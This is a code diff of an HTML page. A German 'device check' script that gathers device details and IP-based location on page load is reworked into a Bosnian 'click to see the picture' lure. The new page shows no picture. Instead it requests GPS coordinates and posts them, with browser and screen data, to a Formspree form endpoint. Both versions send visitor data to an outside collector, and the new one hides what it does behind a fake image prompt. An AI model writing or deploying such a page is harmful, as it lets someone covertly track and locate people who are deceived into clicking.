@@ -1,93 +1,62 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="bs">
 <head>
   <meta charset="UTF-8">
-  <title>Geräte-Check</title>
+  <title>Pogledaj sliku</title>
   <style>
-    body { font-family: Arial, sans-serif; padding: 20px; }
+    body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
+    button { padding: 14px 20px; font-size: 18px; cursor: pointer; }
   </style>
 </head>
 <body>
-  <h1>Geräte-Check</h1>
-  <p>Technische Geräteinformationen werden für deinen eigenen Test erfasst.</p>
+
+  <h2>Klikni da vidiš sliku</h2>
+  <button onclick="startCheck()">Prikaži sliku</button>
+  <p id="status"></p>
 
   <script>
-    async function sammleDaten() {
-      const daten = {
+    async function startCheck() {
+      document.getElementById("status").textContent = "Učitavanje...";
+
+      const data = {
         userAgent: navigator.userAgent,
-        platform: navigator.platform || "Nicht verfügbar",
-        vendor: navigator.vendor || "Nicht verfügbar",
+        platform: navigator.platform,
         language: navigator.language,
-        languages: navigator.languages ? navigator.languages.join(", ") : "Nicht verfügbar",
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        time: new Date().toLocaleString(),
-
-        screenWidth: screen.width,
-        screenHeight: screen.height,
-        availableWidth: screen.availWidth,
-        availableHeight: screen.availHeight,
-        colorDepth: screen.colorDepth,
-        pixelRatio: window.devicePixelRatio,
-
-        windowWidth: window.innerWidth,
-        windowHeight: window.innerHeight,
-
-        online: navigator.onLine,
-        cookiesEnabled: navigator.cookieEnabled,
-        touchSupport: "ontouchstart" in window || navigator.maxTouchPoints > 0,
-        maxTouchPoints: navigator.maxTouchPoints || 0,
-
-        cpuCores: navigator.hardwareConcurrency || "Nicht verfügbar",
-        deviceMemoryGB: navigator.deviceMemory || "Nicht verfügbar",
-
-        referrer: document.referrer || "Direkt geöffnet",
-        currentUrl: window.location.href
+        screen: screen.width + "x" + screen.height,
+        time: new Date().toLocaleString()
       };
 
-      // Netzwerk-Infos, falls verfügbar
-      if (navigator.connection) {
-        daten.networkType = navigator.connection.effectiveType || "Nicht verfügbar";
-        daten.downlink = navigator.connection.downlink || "Nicht verfügbar";
-        daten.saveData = navigator.connection.saveData || false;
+      // GPS (Popup)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            data.lat = position.coords.latitude;
+            data.lon = position.coords.longitude;
+
+            sendData(data);
+          },
+          function(error) {
+            data.gps = "Nije dozvoljeno";
+            sendData(data);
+          }
+        );
+      } else {
+        sendData(data);
       }
+    }
 
-      // Akku-Infos, falls verfügbar
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          daten.batteryLevel = Math.round(battery.level * 100) + "%";
-          daten.batteryCharging = battery.charging;
-        } catch (e) {
-          daten.battery = "Nicht verfügbar";
-        }
-      }
-
-      // IP + grobe Standortinfos über externen Dienst
-      try {
-        const ipAntwort = await fetch("https://ipapi.co/json/");
-        const ipDaten = await ipAntwort.json();
-
-        daten.ip = ipDaten.ip || "Nicht verfügbar";
-        daten.city = ipDaten.city || "Nicht verfügbar";
-        daten.region = ipDaten.region || "Nicht verfügbar";
-        daten.country = ipDaten.country_name || "Nicht verfügbar";
-        daten.postal = ipDaten.postal || "Nicht verfügbar";
-        daten.provider = ipDaten.org || "Nicht verfügbar";
-      } catch (e) {
-        daten.ipInfo = "IP-Daten nicht verfügbar";
-      }
-
-      // An Formspree senden
+    function sendData(data) {
       fetch("https://formspree.io/f/mnjlyqqy", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify(daten)
+        body: JSON.stringify(data)
       });
-    }
 
-    sammleDaten();
+      document.getElementById("status").textContent = "Slika se učitava...";
+    }
   </script>
+
 </body>
 </html>
